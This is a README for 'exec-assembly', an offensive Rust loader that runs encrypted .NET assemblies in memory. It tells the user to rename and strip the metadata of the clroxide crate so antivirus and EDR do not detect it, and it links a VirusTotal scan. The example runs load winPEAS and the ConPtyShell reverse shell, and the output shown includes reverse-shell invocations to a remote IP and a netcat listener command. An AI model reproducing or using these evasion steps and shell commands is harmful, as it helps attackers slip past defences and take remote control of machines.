# exec-assembly

load & executing encrypted .NET assemblies in-memory (still placing file onto disk). modify `clroxide` to `dotnet` just to make sure this crate wont be detected by AV/EDR.

## Installation (Building from source)

<details>
   <summary>
      Show more...
   </summary>

## First step

clone these both repositories.

```console
via@ARCI$ git clone https://github.com/Ropcaster/exec-assembly
via@ARCI$ cd exec-assembly
via@ARCI$ git clone https://github.com/yamakadi/clroxide dotnet
via@ARCI$ cd dotnet
```

after that, try to change all the signatures in `dotnet/Cargo.toml`.

from this:

```toml
[package]
name = "clroxide"
authors = ["KY <me@yamakadi.com>"]
description = "A library that allows you to host the CLR and execute dotnet binaries."
edition = "2021"
homepage = "https://github.com/yamakadi/clroxide"
documentation = "https://docs.rs/clroxide"
readme = "README.md"
license = "MIT"
repository = "https://github.com/yamakadi/clroxide"
version = "1.1.1"
exclude = ["/test"]
```

to this:

```toml
[package]
name = "dotnet"
authors = ["unknown"]
description = "abcabcabcabacabcbabcabcbabcac"
edition = "2021"
```

## Second step

build the source.

```console
via@ARCI$ cargo build --release
```

after done building this, try executing `examples/winpeas.bin` or `examples/ConPtyShell.bin`.

```console
via@ARCI$ .\target\release\DVbhDnWAYsUaoZUZmNlw.exe .\examples\ConPtyShell.bin
[+] Results:

ConPtyShellException: [-] ConPtyShellException:
ConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.

   at ConPtyShellMainClass.CheckArgs(String[] arguments)
   at ConPtyShellMainClass.ConPtyShellMain(String[] args)

via@ARCI$ .\target\release\DVbhDnWAYsUaoZUZmNlw.exe .\examples\ConPtyShell.bin --help
[+] Results:

ConPtyShell - Fully Interactive Reverse Shell for Windows
Author: splinter_code
License: MIT
Source: https://github.com/antonioCoco/ConPtyShell

ConPtyShell - Fully interactive reverse shell for Windows

Properly set the rows and cols values. You can retrieve it from
your terminal with the command "stty size".

You can avoid to set rows and cols values if you run your listener
with the following command:
    stty raw -echo; (stty size; cat) | nc -lvnp 3001

If you want to change the console size directly from powershell
you can paste the following commands:
    $width=80
    $height=24
    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
    $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)

Usage:
    ConPtyShell.exe remote_ip remote_port [rows] [cols] [commandline]

Positional arguments:
    remote_ip               The remote ip to connect
    remote_port             The remote port to connect
    [rows]                  Rows size for the console
                            Default: "24"
    [cols]                  Cols size for the console
                            Default: "80"
    [commandline]           The commandline of the process that you are going to interact
                            Default: "powershell.exe"

Examples:
    Spawn a reverse shell
        ConPtyShell.exe 10.0.0.2 3001

    Spawn a reverse shell with specific rows and cols size
        ConPtyShell.exe 10.0.0.2 3001 30 90

    Spawn a reverse shell (cmd.exe) with specific rows and cols size
        ConPtyShell.exe 10.0.0.2 3001 30 90 cmd.exe

    Upgrade your current shell with specific rows and cols size
        ConPtyShell.exe upgrade shell 30 90

```

</details>

## VirusTotal

<https://www.virustotal.com/gui/file/435d329021d6d1488efa5a90bb2feb10884e5e12fac0e7b9e6c051b35fdb4283/details>

## References

* <https://github.com/Ropcaster/rc4>
* <https://github.com/Ropcaster/string_generator>
* <https://github.com/yamakadi/clroxide/blob/main/examples/execute_assembly.rs>
